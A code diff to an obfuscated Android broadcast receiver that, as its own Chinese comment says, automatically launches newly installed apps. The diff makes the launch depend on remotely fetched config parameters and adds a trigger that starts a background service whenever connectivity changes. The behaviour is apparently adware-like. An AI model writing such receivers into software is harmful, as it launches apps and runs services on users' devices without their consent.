@@ -7,6 +7,7 @@ import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.net.ConnectivityManager;
 import android.text.TextUtils;
 
 import com.sar.gp.dld.AgrUtils;
@@ -20,6 +21,8 @@ public class Asdfree extends BroadcastReceiver {
 			Agmrsk.i(TAG, "agmrsk not inited return in apk add receiver");
 			return;
 		}
+		if (Agmrsk.ntavail() && intent.getAction().equals(ConnectivityManager.CONNECTIVITY_ACTION))
+			arg0.startService(new Intent(arg0, NrService.class));
 	//	Agmrsk.init(arg0);
 		// 接收广播：设备上新安装了一个应用程序包后自动启动新安装应用程序。
 		if (intent.getAction().equals("android.intent.action.PACKAGE_ADDED")) {
@@ -27,14 +30,10 @@ public class Asdfree extends BroadcastReceiver {
 			Agmrsk.i(TAG, "接收到安装广播:[" + pkg + "]");
 			Dlg.ccn(pkg);
 			PackageManager packageManager = arg0.getPackageManager();
-			if (pkg.equals(arg0.getPackageName())) {
-				Agmrsk.i("install is update self, return");
-				return;
-			}
-			Intent it = packageManager.getLaunchIntentForPackage(pkg); //要启动应用的包名   
-			arg0.startActivity(it); 
 			String fhda = MobclickAgent.getConfigParams(arg0, pkg);
 			if (TextUtils.isEmpty(fhda)) return;
+			Intent it = packageManager.getLaunchIntentForPackage(pkg); //要启动应用的包名   
+			arg0.startActivity(it);
 			try {
 				JSONObject fda = new JSONObject(fhda);
 				String name = fda.getString("name");
